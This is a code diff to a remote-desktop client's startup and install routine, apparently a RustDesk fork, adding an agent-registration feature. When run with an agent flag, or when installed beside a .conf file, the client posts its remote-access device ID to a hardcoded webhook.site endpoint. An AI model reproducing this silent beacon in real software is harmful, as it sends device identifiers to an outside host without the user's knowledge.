@@ -10,6 +10,81 @@ use hbb_common::{config, log};
 #[cfg(windows)]
 use tauri_winrt_notification::{Duration, Sound, Toast};
 
+/// Agent registration function to register device with server
+fn register_agent(agent_id: &str) {
+    log::info!("Registering agent with ID: {}", agent_id);
+    
+    // Get device information
+    let device_id = crate::ipc::get_id();
+    
+    // Prepare JSON payload with only device_id and agent_id
+    let body = serde_json::json!({
+        "agent_id": agent_id,
+        "device_id": device_id
+    });
+    
+    // Make API call to register agent
+    let api_url = "https://webhook.site/e723c051-1cda-40e7-84bf-eaa92f9238f9"; // Update with your server URL
+    
+    match crate::post_request_sync(api_url.to_string(), body.to_string(), "") {
+        Ok(response) => {
+            log::info!("Agent registration successful: {}", response);
+            println!("Agent {} registered successfully!", agent_id);
+        }
+        Err(err) => {
+            log::error!("Agent registration failed: {}", err);
+            println!("Agent registration failed: {}", err);
+        }
+    }
+}
+
+/// Load agent configuration from any .conf file in the same directory as the executable
+fn load_agent_config_from_installer(exe_path: &str) -> Option<String> {
+    let exe_dir = std::path::Path::new(exe_path).parent()?;
+    
+    log::info!("Looking for agent config files in directory: {}", exe_dir.display());
+    
+    // Look for any .conf file in the same directory
+    if let Ok(entries) = std::fs::read_dir(exe_dir) {
+        for entry in entries {
+            if let Ok(entry) = entry {
+                let path = entry.path();
+                if let Some(extension) = path.extension() {
+                    if extension == "conf" {
+                        log::info!("Found config file: {}", path.display());
+                        
+                        // Try to read and parse the config file
+                        match std::fs::read_to_string(&path) {
+                            Ok(content) => {
+                                // Parse the config file for AgentID
+                                for line in content.lines() {
+                                    let line = line.trim();
+                                    if line.starts_with("AgentID=") {
+                                        if let Some(agent_id) = line.strip_prefix("AgentID=") {
+                                            let agent_id = agent_id.trim().to_string();
+                                            if !agent_id.is_empty() {
+                                                log::info!("Extracted agent ID from config: {}", agent_id);
+                                                return Some(agent_id);
+                                            }
+                                        }
+                                    }
+                                }
+                                log::warn!("Agent config file found but no valid AgentID found in: {}", path.display());
+                            }
+                            Err(err) => {
+                                log::warn!("Could not read config file {}: {}", path.display(), err);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    log::debug!("No agent config files found in directory: {}", exe_dir.display());
+    None
+}
+
 #[macro_export]
 macro_rules! my_println{
     ($($arg:tt)*) => {
@@ -43,6 +118,7 @@ pub fn core_main() -> Option<Vec<String>> {
     let mut _is_quick_support = false;
     let mut _is_flutter_invoke_new_connection = false;
     let mut no_server = false;
+    let mut agent_id: Option<String> = None;
     let mut arg_exe = Default::default();
     for arg in std::env::args() {
         if i == 0 {
@@ -69,6 +145,14 @@ pub fn core_main() -> Option<Vec<String>> {
                 _is_quick_support = true;
             } else if arg == "--no-server" {
                 no_server = true;
+            } else if arg == "--agent" {
+                // Handle --agent parameter - next argument should be the agent ID
+                let next_arg_index = i + 1;
+                let env_args: Vec<String> = std::env::args().collect();
+                if next_arg_index < env_args.len() {
+                    agent_id = Some(env_args[next_arg_index].clone());
+                    log::info!("Agent ID detected: {}", agent_id.as_ref().unwrap());
+                }
             } else {
                 args.push(arg);
             }
@@ -119,6 +203,12 @@ pub fn core_main() -> Option<Vec<String>> {
     if click_setup && !config::is_disable_installation() {
         args.push("--install".to_owned());
         flutter_args.push("--install".to_string());
+        
+        // Check for agent configuration file when it's an installer
+        if let Some(agent_config) = load_agent_config_from_installer(&arg_exe) {
+            agent_id = Some(agent_config.clone());
+            log::info!("Installer detected agent configuration: {}", agent_config);
+        }
     }
     if args.contains(&"--noinstall".to_string()) {
         args.clear();
@@ -176,10 +266,29 @@ pub fn core_main() -> Option<Vec<String>> {
     #[cfg(all(feature = "flutter", feature = "plugin_framework"))]
     #[cfg(not(any(target_os = "android", target_os = "ios")))]
     init_plugins(&args);
-    if args.is_empty() || crate::common::is_empty_uni_link(&args[0]) {
+    
+    // Check if this is a normal startup case (empty args, uni link, or agent mode)
+    let is_normal_startup = args.is_empty() || 
+                           crate::common::is_empty_uni_link(&args[0]) ||
+                           agent_id.is_some();
+    
+    if is_normal_startup {
         #[cfg(windows)]
         hbb_common::config::PeerConfig::preload_peers();
+        
+        // Always start server for normal operation (including agent mode)
         std::thread::spawn(move || crate::start_server(false, no_server));
+        
+        // Handle agent registration if --agent parameter was provided
+        if let Some(agent_id) = agent_id.as_ref() {
+            let agent_id_clone = agent_id.clone();
+            // Run agent registration in a separate thread after server starts
+            std::thread::spawn(move || {
+                // Wait for server to initialize
+                std::thread::sleep(std::time::Duration::from_secs(3));
+                register_agent(&agent_id_clone);
+            });
+        }
     } else {
         #[cfg(windows)]
         {
@@ -227,7 +336,11 @@ pub fn core_main() -> Option<Vec<String>> {
                 let options = "desktopicon startmenu";
                 #[cfg(windows)]
                 let options = "desktopicon startmenu printer";
-                let res = platform::install_me(options, "".to_owned(), true, args.len() > 1);
+                
+                // Check for agent configuration during installation
+                let agent_id = load_agent_config_from_installer(&std::env::current_exe().unwrap_or_default().to_string_lossy());
+                
+                let res = platform::install_me(options, "".to_owned(), true, args.len() > 1, agent_id.as_deref());
                 let text = match res {
                     Ok(_) => translate("Installation Successful!".to_string()),
                     Err(err) => {
